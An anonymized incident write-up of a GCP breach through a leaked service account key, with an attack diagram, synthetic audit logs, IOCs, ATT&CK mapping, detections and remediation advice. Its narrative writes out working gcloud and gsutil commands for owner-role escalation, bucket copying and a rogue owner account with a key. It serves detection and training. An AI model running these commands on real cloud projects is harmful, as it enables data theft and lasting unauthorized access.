🛡 GCP Service Account Key Abuse (Anonymized)
📌 Executive Summary

This case describes a GCP compromise where a leaked service account key was abused.
The attacker authenticated directly to Google Cloud APIs, escalated privileges by impersonating other service accounts, and accessed sensitive GCS buckets.
Persistence was achieved by creating a new service account with Owner role.

🎯 Outcome: confirmed cloud credential theft, privilege escalation, sensitive data exfiltration, and persistence.

___________________________________________________________________________________________________________________________________________________________________

🖼 Attack Flow (ASCII Diagram)

+----------------------------+
| External Attacker          |
| (Leaked GCP SA Key)        |
+----------------------------+
             |
             v
+----------------------------+
| gcloud auth activate       |
| (Initial Access)           |
+----------------------------+
             |
             v
+----------------------------+
| Reconnaissance             |
| - gcloud projects list     |
| - gcloud storage buckets   |
+----------------------------+
             |
             v
+----------------------------+
| Privilege Escalation       |
| Service Account Imperson.  |
| → Owner Role               |
+----------------------------+
             |
             v
+----------------------------+
| Data Exfiltration          |
| gsutil cp GCS → External   |
+----------------------------+
             |
             v
+----------------------------+
| Persistence                |
| New SA Key w/ Owner Role   |
+----------------------------+

___________________________________________________________________________________________________________________________________________________________________

📖 Attack Narrative

---------------------------------------
Stage 1 – Initial Access

🔴 Leaked service account JSON key discovered in public GitHub repo.

🟡 Attacker authenticated via:
gcloud auth activate-service-account --key-file=key.json

---------------------------------------
Stage 2 – Reconnaissance

🔴 Enumerated projects:
gcloud projects list

🟡 Listed storage buckets:
gcloud storage buckets list

---------------------------------------
Stage 3 – Privilege Escalation

🔴 Abused Service Account Impersonation to escalate to roles/owner:

gcloud iam service-accounts add-iam-policy-binding \
   victim-sa@project.iam.gserviceaccount.com \
   --member="serviceAccount:attacker-sa@project.iam.gserviceaccount.com" \
   --role="roles/owner"

---------------------------------------
Stage 4 – Exfiltration & Persistence

🔴 Exfiltrated bucket data:

gsutil -m cp -r gs://sensitive-bucket ./loot

🟡 Created new service account + key with roles/owner:

gcloud iam service-accounts create rogue-sa
gcloud projects add-iam-policy-binding project-id \
   --member="serviceAccount:rogue-sa@project.iam.gserviceaccount.com" \
   --role="roles/owner"
gcloud iam service-accounts keys create rogue-key.json \
   --iam-account=rogue-sa@project.iam.gserviceaccount.com

___________________________________________________________________________________________________________________________________________________________________

⏱️ Timeline (UTC)

| Time  | Event                                          |
| ----- | ---------------------------------------------- |
| 11:05 | 🔴 SA key used for authentication              |
| 11:15 | 🟡 Recon: listed projects and storage buckets  |
| 11:30 | 🔴 Service account impersonation → Owner role  |
| 11:45 | 🔴 Exfiltration: GCS data copied externally    |
| 12:10 | 🟡 New SA + Owner role created for persistence |

___________________________________________________________________________________________________________________________________________________________________

📂 Artifacts (Synthetic / Cloud Audit Logs)

{
  "protoPayload": {
    "methodName": "google.iam.credentials.v1.IAMCredentials.GenerateAccessToken",
    "authenticationInfo": {
      "principalEmail": "attacker@external.com"
    },
    "serviceName": "iamcredentials.googleapis.com"
  },
  "resource": { "type": "service_account" },
  "timestamp": "2025-07-21T11:05:23Z"
}

{
  "protoPayload": {
    "methodName": "storage.objects.list",
    "authenticationInfo": { "principalEmail": "victim-sa@project.iam.gserviceaccount.com" },
    "serviceName": "storage.googleapis.com"
  },
  "resource": { "type": "gcs_bucket", "labels": { "bucket_name": "sensitive-bucket" } },
  "timestamp": "2025-07-21T11:15:44Z"
}

{
  "protoPayload": {
    "methodName": "google.iam.admin.v1.CreateServiceAccount",
    "authenticationInfo": { "principalEmail": "attacker@external.com" },
    "serviceName": "iam.googleapis.com"
  },
  "resource": { "type": "project", "labels": { "project_id": "project-id" } },
  "timestamp": "2025-07-21T12:10:05Z"
}

___________________________________________________________________________________________________________________________________________________________________

🧾 IOCs (Synthetic)

| Type    | Value                                                                                         | Status           |
| ------- | --------------------------------------------------------------------------------------------- | ---------------- |
| Account | [victim-sa@project.iam.gserviceaccount.com](mailto:victim-sa@project.iam.gserviceaccount.com) | Abused           |
| Account | [rogue-sa@project.iam.gserviceaccount.com](mailto:rogue-sa@project.iam.gserviceaccount.com)   | Persistence      |
| Key     | `key.json` (public repo leak)                                                                 | Compromised      |
| Bucket  | gs\://sensitive-bucket                                                                        | Exfiltrated      |
| Tool    | gcloud, gsutil                                                                                | Used by attacker |

___________________________________________________________________________________________________________________________________________________________________

🔑 Key Findings


Service account key exposed in public repo.

Attacker escalated via SA impersonation → Owner role.

Sensitive data exfiltrated from Google Cloud Storage.

Persistence maintained via new rogue SA with Owner role.

___________________________________________________________________________________________________________________________________________________________________

🗂️ MITRE ATT&CK Mapping


T1552.001 – Unsecured Credentials (Exposed Keys)

T1078.004 – Valid Accounts: Cloud Accounts

T1098 – Account Manipulation (SA Impersonation)

T1530 – Data Exfiltration from Cloud Storage

T1136.003 – Create Account (New Service Account)

___________________________________________________________________________________________________________________________________________________________________

👀 Detection Use Cases


🚨 Alert on usage of service account keys from unknown IPs.

Detect gcloud auth activate-service-account executions.

Monitor SA impersonation calls → privilege escalation.

Alert on creation of new service accounts with roles/owner.

Detect large-volume gsutil cp activity to external destinations.

___________________________________________________________________________________________________________________________________________________________________

🛡️ Recommendations


Rotate & revoke leaked service account keys immediately.

Use Workload Identity Federation instead of long-lived keys.

Restrict SA impersonation to least privilege.

Enable Cloud Audit Logs for SA activity.

Implement DLP & monitoring for GCS bucket exfiltration.
